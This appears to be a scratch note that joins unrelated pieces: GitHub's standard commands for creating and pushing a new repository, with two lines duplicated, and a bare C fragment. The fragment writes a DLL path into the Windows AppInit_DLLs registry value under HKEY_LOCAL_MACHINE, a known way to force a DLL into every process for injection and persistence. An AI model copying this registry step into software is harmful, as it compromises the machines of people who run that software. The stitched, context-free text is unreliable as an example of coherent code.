echo "# cajave" >> README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin git@github.com:cajave/cajave.git
git push -u origin master

git remote add origin git@github.com:cajave/cajave.git
git push -u origin master

#define DSTKEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			DSTKEY,
			0,
			KEY_ALL_ACCESS,
			&hKey);
RegSetValueEx(hKey,
			"AppInit_DLLs",
			0,
			REG_SZ,
			cDllPath,
			strlen((char*)cDllPath)+1);